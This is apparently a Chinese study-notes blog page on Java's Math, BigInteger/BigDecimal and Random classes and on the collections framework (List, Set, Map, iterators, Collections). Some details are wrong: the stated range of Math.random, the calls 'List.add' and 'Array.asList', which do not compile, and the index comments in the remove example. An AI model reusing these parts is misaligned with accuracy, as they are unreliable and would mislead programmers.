<p><code>public static double abs(double a) </code> ：返回 double 值的绝对值。<br><code>public static double ceil(double a)</code> ：返回大于等于参数的最小的整数。<br><code>public static double floor(double a) </code> ：返回小于等于参数最大的整数。<br><code>public static long round(double a)</code> ：返回最接近参数的 long，.5向大数取。(相当于四舍五入方法)<br> 注意round(-12.5)&#x3D;-12 round(-12.6)&#x3D;-13 round(12.5)&#x3D;13<br><code>public static double random()</code>：返回[0,1]的随机值<br>public static double pow(double a,double b)：返回a的b幂次方法<br>public static double sqrt(double a)：返回a的平方根<br>public static final double PI：返回圆周率<br>public static double max(double x, double y)：返回x,y中的最大值<br>public static double min(double x, double y)：返回x,y中的最小值<br>其它：acos,asin,atan,cos,sin,tan 三角函数</p>
<h5 id="BigInteger、BigDecimal"><a href="#BigInteger、BigDecimal" class="headerlink" title="BigInteger、BigDecimal"></a>BigInteger、BigDecimal</h5><p>Integer类作为int的包装类，能存储的最大整型值为2^31-1，Long类也是有限的，最大为2^63-1。如果要表示再大的整数，不管是基本数据类型还是他们的包装类都无能为力，更不用说进行运算了。<br>任意精度的整数和浮点数<br>java.math.BigInteger<br>java.math.BigDecimal</p>
<p><strong>BigInteger</strong><br>java.math包的BigInteger可以表示<code>不可变的任意精度的整数</code>。BigInteger 提供所有 Java 的基本整数操作符的对应物，并提供 java.lang.Math 的所有相关方法。另外，BigInteger 还提供以下运算：模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。 </p>
<p>构造器<br>BigInteger(String val)：根据字符串构建BigInteger对象</p>
<p>方法</p>
<ul>
<li>public BigInteger <code>abs</code>()：返回此 BigInteger 的绝对值的 BigInteger。</li>
<li>BigInteger <code>add</code>(BigInteger val) ：返回其值为 (this + val) 的 BigInteger</li>
<li>BigInteger <code>subtract</code>(BigInteger val) ：返回其值为 (this - val) 的 BigInteger</li>
<li>BigInteger <code>multiply</code>(BigInteger val) ：返回其值为 (this * val) 的 BigInteger</li>
<li>BigInteger <code>divide</code>(BigInteger val) ：返回其值为 (this &#x2F; val) 的 BigInteger。整数相除只保留整数部分。</li>
<li>BigInteger <code>remainder</code>(BigInteger val) ：返回其值为 (this % val) 的 BigInteger。</li>
<li>BigInteger[] <code>divideAndRemainder</code>(BigInteger val)：返回包含 (this &#x2F; val) 后跟 (this % val) 的两个 BigInteger 的数组。</li>
<li>BigInteger <code>pow</code>(int exponent) ：返回其值为 (this^exponent) 的 BigInteger。</li>
</ul>
<p><strong>BigDecimal</strong><br>BigDecimal类支持不可变的、任意精度的有符号十进制定点数。</p>
<p>构造器</p>
<ul>
<li>public BigDecimal(double val)</li>
<li>public BigDecimal(String val) –&gt; 推荐</li>
</ul>
<p>常用方法</p>
<ul>
<li>public BigDecimal <code>add</code>(BigDecimal augend)</li>
<li>public BigDecimal <code>subtract</code>(BigDecimal subtrahend)</li>
<li>public BigDecimal <code>multiply</code>(BigDecimal multiplicand)</li>
<li>public BigDecimal <code>divide</code>(BigDecimal divisor, int scale, int roundingMode)：divisor是除数，scale指明保留几位小数，roundingMode指明舍入模式（ROUND_UP :向上加1、ROUND_DOWN :直接舍去、ROUND_HALF_UP:四舍五入）</li>
</ul>
<h5 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h5><p>用于产生随机数</p>
<ul>
<li><code>boolean nextBoolean()</code>:返回下一个伪随机数，它是取自此随机数生成器序列的均匀分布的 boolean 值。 </li>
<li><code>void nextBytes(byte[] bytes)</code>:生成随机字节并将其置于用户提供的 byte 数组中。 </li>
<li><code>double nextDouble()</code>:返回下一个伪随机数，它是取自此随机数生成器序列的、在 0.0 和 1.0 之间均匀分布的 double 值。 </li>
<li><code>float nextFloat()</code>:返回下一个伪随机数，它是取自此随机数生成器序列的、在 0.0 和 1.0 之间均匀分布的 float 值。 </li>
<li><code>double nextGaussian()</code>:返回下一个伪随机数，它是取自此随机数生成器序列的、呈高斯（“正态”）分布的 double 值，其平均值是 0.0，标准差是 1.0。 </li>
<li><code>int nextInt()</code>:返回下一个伪随机数，它是此随机数生成器的序列中均匀分布的 int 值。 </li>
<li><code>int nextInt(int n)</code>:返回一个伪随机数，它是取自此随机数生成器序列的、在 0（包括）和指定值（不包括）之间均匀分布的 int 值。 </li>
<li><code>long nextLong()</code>:返回下一个伪随机数，它是取自此随机数生成器序列的均匀分布的 long 值。</li>
</ul>
<hr>
<h3 id="第12章-集合框架"><a href="#第12章-集合框架" class="headerlink" title="第12章_集合框架"></a>第12章_集合框架</h3><p>数组的特点及其弊端：</p>
<ol>
<li>数组一旦初始化，长度即确定，不可更改</li>
<li>数组的多个元素是依次紧密排序的，有序，可重复的，无法存储无序不可重复数据</li>
<li>数组可用的方法属性较少</li>
<li>（优点）数组一旦初始化完成，其元素类型即确定，不是此类不可添加（可以声明Object数组存放多种数据类型数据）</li>
<li>插入，删除操作性能差</li>
</ol>
<p>Java集合框架</p>
<p>java.util.Collection存储一个一个的数据<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240713170651.png" alt="Collection接口继承树"></p>
<ul>
<li>子接口List：存储有序可重复的数据(动态数组，可自动扩容)<ul>
<li>ArrayList：主要实现类，线程不安全但效率高；底层使用<strong>object[]数组</strong>存储，利于<strong>查询尾部添加和删除</strong></li>
<li>LinkedList：底层使用<strong>双向链表</strong>的方式进行存储，有利于<strong>随机插入，删除，修改</strong></li>
<li>Vector：过时实现类，线程安全效率低；底层使用<strong>object[]数组</strong>存储</li>
</ul>
</li>
<li>子接口Set:存储无序的不可重复的数据(集合)<ul>
<li>HashSet：主要实现类；不能保证元素的排列顺序，线程不安全，元素可以是null，底层使用HashMap，即使用数组+单向链表+红黑树结构存储(jdk&gt;&#x3D;8)<ul>
<li>LinkedHashSet：HashSet的子类，在HashSet的基础上添加了一组双向链表以记录添加元素的先后顺序，即可以按照添加元素的顺序遍历</li>
</ul>
</li>
<li>TreeSet：底层使用红黑树存储，可以按照添加元素的指定的属性的大小顺序进行遍历，需要考虑使用自然排序和定制排序，添加的key元素必须是同一类型</li>
</ul>
</li>
</ul>
<p>java.util.Map:存储一对一对的数据(key-value键值对)<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240713170738.png" alt="Map接口继承树"></p>
<ul>
<li>HashMap：主要实现类，线程不安全，效率高，可以添加null的key&#x2F;value值，使用数组+单向链表+红黑树结构存储(jdk&gt;&#x3D;8)<ul>
<li>LinkedHashMap：HashMap的子类，在HashMap的基础上添加了一组双向链表以记录添加元素的先后顺序，即可以按照添加元素的顺序遍历，频繁遍历建议使用此类</li>
</ul>
</li>
<li>Hashtable：过时实现类，线程安全，效率低，不可添加null的key&#x2F;value值，使用数组+单向链表结构存储<ul>
<li>Properties：其key和value都是String类型，常用于处理属性文件</li>
</ul>
</li>
<li>TreeMap：底层使用红黑树存储，可以按照添加key-value中的key元素的指定的属性的大小顺序进行遍历，需要考虑使用自然排序和定制排序，添加的元素必须是同一类型</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240713170456.png" alt="学习目标"></p>
<h4 id="Collection接口常用方法"><a href="#Collection接口常用方法" class="headerlink" title="Collection接口常用方法"></a>Collection接口常用方法</h4><p>JDK不提供此接口的任何直接实现，而是提供更具体的子接口（如：Set和List）去实现，该接口里定义的方法既可用于操作 Set 集合，也可用于操作 List 集合。方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="type">Collection</span> <span class="variable">collection1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>,<span class="number">12</span>);</span><br><span class="line">    collection.add(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">    collection.add(p1);</span><br><span class="line">    collection.add(<span class="number">11</span>);<span class="comment">//操作基本数据类型时存在自动装箱</span></span><br><span class="line">    collection1.add(collection);</span><br><span class="line"></span><br><span class="line">    System.out.println(collection.isEmpty());</span><br><span class="line">    System.out.println(collection.contains(<span class="string">&quot;aa&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>添加</strong><br>（1）<code>add(E obj)</code>：添加元素对象到当前集合中<br>（2）addAll(Collection other)：添加other集合中的所有元素对象到当前集合中，即this &#x3D; this ∪ other<br>注意：使用add(Collection other)将把other集合作为一个整体元素添加到当前集合中</p>
<p><strong>判断</strong><br>（3）int size()：获取当前集合中实际存储的元素个数<br>（4）boolean isEmpty()：判断当前集合是否为空集合<br>（5）<code>boolean contains(Object obj)</code>：判断当前集合中是否存在一个obj对象equals返回true的元素，对于内置数据类型，比较的是实际内容而不是地址，对于自定义类的对象，需要重写equals()方法，否则比较地址<br>（6）boolean containsAll(Collection coll)：判断coll集合中的元素是否在当前集合中都存在。即coll集合是否是当前集合的“子集”<br>（7）boolean equals(Object obj)：判断当前集合与obj是否相等（很少用）</p>
<p><strong>删除</strong><br>（8）void clear()：清空集合元素（逐个置为null）<br>（9） <code>boolean remove(Object obj)</code> ：从当前集合中删除第一个找到的与obj对象equals返回true的元素。底层调用了equals()方法，因此自定义类删除需要重写equals()方法<br>（10）boolean removeAll(Collection coll)：从当前集合中删除所有与coll集合中相同的元素。即this &#x3D; this - this ∩ coll<br>（11）boolean retainAll(Collection coll)：从当前集合中删除两个集合中不同的元素，使得当前集合仅保留与coll集合中的元素相同的元素，即当前集合中仅保留两个集合的交集，即this  &#x3D; this ∩ coll；</p>
<p><strong>其它</strong><br>（12）<code>Object[] toArray()</code>：返回包含当前集合中所有元素的数组 集合 –&gt; 数组<br>（13）hashCode()：获取集合对象的哈希值<br>（14）iterator()：返回迭代器对象，用于集合遍历<br>相关方法：数组 –&gt; 集合 数组中asList()方法，返回List型对象<br>Arrays.asList(…) 方法返回的 List 集合，既不是 ArrayList 实例，也不是 Vector 实例。 Arrays.asList(…) 返回值是一个固定长度的 List 集合<br>需要注意：asList()方法参数是对象，不能传入基本数据类型，因此：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">list1</span> <span class="operator">=</span> Arrays.asList(arr1);<span class="comment">// 存入数组的起始地址</span></span><br><span class="line">System.out.println(list1.size());<span class="comment">//1，</span></span><br><span class="line"></span><br><span class="line">Integer[] arr = <span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> Arrays.asList(arr);<span class="comment">//自动装箱</span></span><br><span class="line">System.out.println(list.size());<span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p><strong>Collection使用要求</strong><br>向Collection中添加元素时必须重写其中的equals()方法，因为其中许多方法隐式调用了equals()方法</p>
<h5 id="List子接口常用方法"><a href="#List子接口常用方法" class="headerlink" title="List子接口常用方法"></a>List子接口常用方法</h5><p>存储有序的可以重复的数据</p>
<p><strong>插入元素</strong></p>
<ul>
<li><code>void add(int index, Object ele)</code>:在index位置插入ele元素</li>
<li>boolean addAll(int index, Collection eles):从index位置开始将eles中的所有元素添加进来<br><strong>获取元素</strong></li>
<li><code>Object get(int index)</code>:获取指定index位置的元素</li>
<li>List subList(int fromIndex, int toIndex):返回从fromIndex到toIndex位置的子集合<br><strong>获取元素索引</strong></li>
<li>int indexOf(Object obj):返回obj在集合中首次出现的位置</li>
<li>int lastIndexOf(Object obj):返回obj在当前集合中末次出现的位置<br><strong>删除和替换元素</strong></li>
<li><code>Object remove(int index)</code>:移除指定index位置的元素，并返回此元素</li>
<li><code>Object set(int index, Object ele)</code>:设置指定index位置的元素为ele</li>
</ul>
<p>注意：使用<code>.add();</code>方法操作基本数据类型时存在自动装箱，因此欲使用其父接口Collection的remove()方法直接删除元素时需要使用包装类的.valueOf(方法)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">List.add(<span class="number">1</span>);</span><br><span class="line">List.add(<span class="number">3</span>);</span><br><span class="line">List.add(<span class="number">4</span>);</span><br><span class="line">list.remove(Integer.valueOf(<span class="number">3</span>));<span class="comment">//删除的是值为3即索引为2的元素</span></span><br><span class="line">list.remove(<span class="number">3</span>);<span class="comment">//删除的是索引为3的元素即4</span></span><br></pre></td></tr></table></figure>

<p><strong>LinkedList</strong>实现类的特有方法</p>
<ul>
<li>void addFirst(Object obj)</li>
<li>void addLast(Object obj)	</li>
<li>Object getFirst()</li>
<li>Object getLast()</li>
<li>Object removeFirst()</li>
<li>Object removeLast()</li>
</ul>
<h5 id="Set子接口常用方法"><a href="#Set子接口常用方法" class="headerlink" title="Set子接口常用方法"></a>Set子接口常用方法</h5><p>存储无序的不可重复的数据，用于过滤重复数据<br>Set接口是Collection的子接口，Set接口相较于Collection接口<em>没有提供额外的方法</em><br>Set 集合不允许包含相同的元素，如果试把两个相同的元素加入同一个 Set 集合中，则添加操作失败。<br>Set集合支持的遍历方式和Collection集合一样：foreach和Iterator。<br>Set的常用实现类有：</p>
<ul>
<li>HashSet<br>遍历时不一定按输入顺序，但也是按固定顺序</li>
<li>LinkedHashSet<br>遍历时按输入顺序</li>
<li>TreeSet</li>
</ul>
<p><strong>Set的无序性</strong><br>不是随机性！也不是指添加顺序和遍历顺序不同。<br>通过哈希算法计算元素的哈希值，根据哈希值计算其在数组中的存储位置，因此元素在存储时不是依次排列的，表现出无序性<br><del>存储时顺序：计算哈希值-&gt;在哈希表中判断是否存在相同哈希值元素-&gt;存在，使用equals对比，不存在直接存入-&gt;相同，不录入</del></p>
<p><strong>Set的不可重复性</strong><br>比较的标准，需要判断hashCode()得到的哈希值以及equals()得到的Boolean型的结果，哈希值相同且equals()返回true则认为元素是相同的，不能添加。</p>
<p><strong>添加元素到HashSet&#x2F;LinkedHashSet的要求</strong><br>因此使用Set添加自定义类对象时**必须重写hashCode()和equals()**方法！！！且两个方法要保持一致性<br>利用idea自动生成，尽可能不要自己重写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>,<span class="number">12</span>));</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Objects.hash(name,age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>TreeSet</strong>的使用</p>
<ol>
<li>判断元素是否相等或其大小的标准：和上文HashSet不同，使用的是自然排序和定制排序，根据compareTo()和compare()方法的返回值</li>
<li>添加到TreeSet中的元素<strong>必须是同一类型</strong>的对象，否则出现ClassCastException</li>
<li>因此需要重写compareTo()或compare方法</li>
</ol>
<p>去除List中重复数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(originList);</span><br><span class="line"><span class="type">List</span> <span class="variable">newList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>(set);</span><br></pre></td></tr></table></figure>

<p>面试题-下列操作均可成功</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line"><span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">1001</span>,<span class="string">&quot;AA&quot;</span>);</span><br><span class="line"><span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">1002</span>,<span class="string">&quot;BB&quot;</span>);</span><br><span class="line"></span><br><span class="line">set.add(p1);</span><br><span class="line">set.add(p2);</span><br><span class="line">p1.name = <span class="string">&quot;CC&quot;</span>;</span><br><span class="line">set.remove(p1);<span class="comment">//不可删除，hashCode不一致</span></span><br><span class="line">System.out.println(set);</span><br><span class="line"></span><br><span class="line">set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">1001</span>,<span class="string">&quot;CC&quot;</span>));<span class="comment">//可以添加，hashCode不一致</span></span><br><span class="line">System.out.println(set);</span><br><span class="line"></span><br><span class="line">set.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">1001</span>,<span class="string">&quot;AA&quot;</span>));<span class="comment">//可以添加，equals不一致</span></span><br><span class="line">System.out.println(set);</span><br><span class="line"><span class="comment">//其中Person类中重写了hashCode()和equal()方法</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="Map接口常用方法"><a href="#Map接口常用方法" class="headerlink" title="Map接口常用方法"></a>Map接口常用方法</h4><p>Map 中的 key 和  value 都可以是任何引用类型的数据。但常用String类作为Map的“键”。<br>以HashMap为例：<br><strong>特点</strong></p>
<ol>
<li>Map 中的 <code>key用Set来存放</code>，<code>不允许重复</code>,无序，即同一个 Map 对象所对应的类，**须重写hashCode()和equals()**方法<br>value值可以重复</li>
<li>key 和 value 之间存在单向一对一关系，即通过指定的 key 总能找到唯一的、确定的 value，不同key对应的<code>value可以重复</code>。value所在的类要重写equals()方法。</li>
<li>key和value构成一个entry。所有的entry彼此之间是<code>无序的</code>、<code>不可重复的</code>，构成一个<code>Set</code>。</li>
</ol>
<p>常用方法<br><strong>添加、修改操作：</strong><br>-<code> Object put(Object key,Object value)</code>：将指定key-value添加到(或<code>修改</code>)当前map对象中</p>
<ul>
<li>void putAll(Map m):将m中的所有key-value对存放到当前map中<br><strong>删除操作：</strong></li>
<li><code>Object remove(Object key)</code>：移除指定key的key-value对，并返回value</li>
<li>void clear()：清空当前map中的所有数据<br><strong>元素查询的操作：</strong></li>
<li><code>Object get(Object key)</code>：获取指定key对应的value</li>
<li>Objext getOrDefault(Object key，defaultValue): 获取指定key对应的value，若不存在此key，返回默认值defaultValue</li>
<li><code>boolean containsKey(Object key)</code>：是否包含指定的key</li>
<li><code>boolean containsValue(Object value)</code>：是否包含指定的value</li>
<li><code>int size()</code>：返回map中key-value对的个数</li>
<li>boolean isEmpty()：判断当前map是否为空</li>
<li>boolean equals(Object obj)：判断当前map和参数对象obj是否相等<br><strong>元视图操作的方法：</strong></li>
<li>Set keySet()：返回所有key构成的Set集合</li>
<li>Collection values()：返回所有value构成的Collection集合</li>
<li>Set entrySet()：返回所有key-value对构成的Set集合</li>
</ul>
<p>HashMap概述</p>
<ul>
<li>HashMap是 Map 接口<code>使用频率最高</code>的实现类。</li>
<li>HashMap是线程不安全的。允许添加 null 键和 null 值。</li>
<li>存储数据采用的哈希表结构，底层使用<code>一维数组</code>+<code>单向链表</code>+<code>红黑树</code>进行key-value数据的存储。与HashSet一样，元素的存取顺序不能保证一致。</li>
<li>HashMap <code>判断两个key相等的标准</code>是：两个 key 的hashCode值相等，通过 equals() 方法返回 true。</li>
<li>HashMap <code>判断两个value相等的标准</code>是：两个 value 通过 equals() 方法返回 true。</li>
</ul>
<p>LinkedHashMap 是 HashMap 的子类</p>
<ul>
<li>存储数据采用的哈希表结构+链表结构，在HashMap存储结构的基础上，使用了一对<code>双向链表</code>来<code>记录添加元素的先后顺序</code>，可以保证遍历元素时，与添加的顺序一致。</li>
<li>通过哈希表结构可以保证键的唯一、不重复，需要键所在类重写hashCode()方法、equals()方法。</li>
</ul>
<p>TreeMap</p>
<ul>
<li>TreeMap存储 key-value 对时，需要根据 key-value 对进行排序。TreeMap 可以保证所有的 key-value 对处于<code>有序状态</code>。</li>
<li>TreeSet底层使用<code>红黑树</code>结构存储数据</li>
<li>TreeMap 的 Key 的排序：<ul>
<li><code>自然排序</code>：TreeMap 的所有的 Key 必须实现 Comparable 接口，而且所有的 Key 应该是同一个类的对象，否则将会抛出 ClasssCastException</li>
<li><code>定制排序</code>：创建 TreeMap 时，构造器传入一个 Comparator 对象，该对象负责对 TreeMap 中的所有 key 进行排序。此时不需要 Map 的 Key 实现 Comparable 接口</li>
</ul>
</li>
<li>TreeMap判断<code>两个key相等的标准</code>：两个key通过compareTo()方法或者compare()方法返回0。</li>
</ul>
<p>Hashtable</p>
<ul>
<li>Hashtable是Map接口的<code>古老实现类</code>，JDK1.0就提供了。不同于HashMap，Hashtable是线程安全的。</li>
<li>Hashtable实现原理和HashMap相同，功能相同。底层都使用哈希表结构（数组+单向链表），查询速度快。</li>
<li>与HashMap一样，Hashtable 也不能保证其中 Key-Value 对的顺序</li>
<li>Hashtable判断两个key相等、两个value相等的标准，与HashMap一致。</li>
<li>与HashMap不同，Hashtable 不允许使用 null 作为 key 或 value。</li>
</ul>
<p>Properties</p>
<ul>
<li>Properties 类是 Hashtable 的子类，该对象用于处理属性文件</li>
<li>由于属性文件里的 key、value 都是字符串类型，所以 Properties 中要求 key 和 value 都是字符串类型</li>
<li>存取数据时，建议使用setProperty(String key,String value)方法和getProperty(String key)方法</li>
</ul>
<p>面试题：Hashtable和HashMap的区别</p>
<blockquote>
<p>HashMap:底层是一个哈希表（jdk7:数组+链表;jdk8:数组+链表+红黑树）,是一个线程不安全的集合,执行效率高<br>Hashtable:底层也是一个哈希表（数组+链表）,是一个线程安全的集合,执行效率低<br>HashMap集合:可以存储null的键、null的值<br>Hashtable集合,不能存储null的键、null的值<br>Hashtable和Vector集合一样,在jdk1.2版本之后被更先进的集合(HashMap,ArrayList)取代了。所以HashMap是Map的主要实现类，Hashtable是Map的古老实现类。<br>Hashtable的子类Properties（配置文件）依然活跃在历史舞台<br>Properties集合是一个唯一和IO流相结合</p>
</blockquote>
<p>实例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">singers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">singer1</span> <span class="operator">=</span> <span class="string">&quot;周杰伦&quot;</span>;</span><br><span class="line">    <span class="type">ArrayList</span> <span class="variable">songs1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    songs1.add(<span class="string">&quot;晴天&quot;</span>);</span><br><span class="line">    songs1.add(<span class="string">&quot;青花瓷&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">singer2</span> <span class="operator">=</span> <span class="string">&quot;林俊杰&quot;</span>;</span><br><span class="line">    <span class="type">ArrayList</span> <span class="variable">songs2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    songs2.add(<span class="string">&quot;江南&quot;</span>);</span><br><span class="line">    songs2.add(<span class="string">&quot;曹操&quot;</span>);</span><br><span class="line"></span><br><span class="line">    singers.put(singer1, songs1);</span><br><span class="line">    singers.put(singer2, songs2);</span><br><span class="line"></span><br><span class="line">    <span class="type">Set</span> <span class="variable">entrySet</span> <span class="operator">=</span> singers.entrySet();</span><br><span class="line"></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> entrySet.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;歌手：&quot;</span> + entry.getKey());</span><br><span class="line">        System.out.println(<span class="string">&quot;歌曲：&quot;</span> + entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h4 id="Iterator迭代器遍历元素"><a href="#Iterator迭代器遍历元素" class="headerlink" title="Iterator迭代器遍历元素"></a>Iterator迭代器遍历元素</h4><p>集合遍历的四种方式<br>一般for循环  迭代器  增强for循环  Stream中forEach()</p>
<p>示例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    collection.add(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">    collection.add(<span class="number">11</span>);</span><br><span class="line">    collection.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Tom&quot;</span>,<span class="number">12</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> collection.iterator();</span><br><span class="line">    <span class="comment">//如果有下一个</span></span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext())&#123;       </span><br><span class="line">        <span class="comment">//输出下一个 ：指针下移，如有下一个，返回</span></span><br><span class="line">        System.out.println(iterator.next());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240714004243.png" alt="迭代器执行原理"></p>
<p><strong>增强for循环</strong>底层实际上就是调用了迭代器<br>注意：增强for循环执行过程中，将集合或数组中元素依次赋值给临时变量，如果在增强for循环中更改元素，可能无法修改（假如传入的是类，改类中属性可能可以）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 集合内部元素类型 临时变量 容器名</span></span><br><span class="line"><span class="keyword">for</span>(Object obj : collection)&#123;</span><br><span class="line">    System.out.println(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="Collections工具类"><a href="#Collections工具类" class="headerlink" title="Collections工具类"></a>Collections工具类</h4><p>一个操作 Set、List 和 Map 等集合的工具类。</p>
<p><strong>排序操作：</strong></p>
<ul>
<li>reverse(List)：反转 List 中元素的顺序</li>
<li>shuffle(List)：对 List 集合元素进行随机排序</li>
<li>sort(List)：根据元素的自然顺序对指定 List 集合元素按升序排序，元素所在类需要重写compareTo方法</li>
<li>sort(List，Comparator)：根据指定的 Comparator 产生的顺序对 List 集合元素进行排序</li>
<li>swap(List，int， int)：将指定 list 集合中的 i 处元素和 j 处元素进行交换</li>
</ul>
<p><strong>查找</strong></p>
<ul>
<li>Object max(Collection)：根据元素的自然顺序，返回给定集合中的最大元素，元素所在类需要重写compareTo方法</li>
<li>Object max(Collection，Comparator)：根据 Comparator 指定的顺序，返回给定集合中的最大元素</li>
<li>Object min(Collection)：根据元素的自然顺序，返回给定集合中的最小元素，元素所在类需要重写compareTo方法</li>
<li>Object min(Collection，Comparator)：根据 Comparator 指定的顺序，返回给定集合中的最小元素</li>
<li>int binarySearch(List list,T key)在List集合中查找某个元素的下标，但是List的元素必须是T或T的子类对象，而且必须是可比较大小的，即支持自然排序的。而且集合也事先必须是有序的，否则结果不确定。<em>采用二分法</em></li>
<li>int binarySearch(List list,T key,Comparator c)在List集合中查找某个元素的下标，但是List的元素必须是T或T的子类对象，而且集合也事先必须是按照c比较器规则进行排序过的，否则结果不确定。</li>
<li>int frequency(Collection c，Object o)：返回指定集合中指定元素的出现次数</li>
</ul>
<p><strong>复制、替换</strong></p>
<ul>
<li>void copy(List dest,List src)：将src中的内容复制到dest中,src的size()必须不大于dest的size();<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">src</span> <span class="operator">=</span> Array.asList(<span class="number">45</span>,<span class="number">22</span>,<span class="number">31</span>,<span class="number">234</span>,<span class="number">43</span>,<span class="number">435</span>,<span class="number">4</span>);</span><br><span class="line"><span class="type">List</span> <span class="variable">dest</span> <span class="operator">=</span> Array.asList(<span class="keyword">new</span> <span class="title class_">Object</span>[src.size()]);</span><br><span class="line">Collections.copy(dest,src);</span><br></pre></td></tr></table></figure></li>
<li>boolean replaceAll(List list，Object oldVal，Object newVal)：使用新值替换 List 对象的所有旧值</li>
<li>提供了多个unmodifiableXxx()方法，该方法返回指定 Xxx的<em>不可修改</em>的视图。</li>
</ul>
<p><strong>添加</strong></p>
<ul>
<li>boolean addAll(Collection  c,T… elements)将所有指定元素添加到指定 collection 中。</li>
</ul>
<p><strong>同步</strong></p>
<ul>
<li>Collections 类中提供了多个 synchronizedXxx() 方法，该方法可使将指定集合包装成线程同步的集合，从而可以解决多线程并发访问集合时的线程安全问题：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240715101443.png"></li>
</ul>
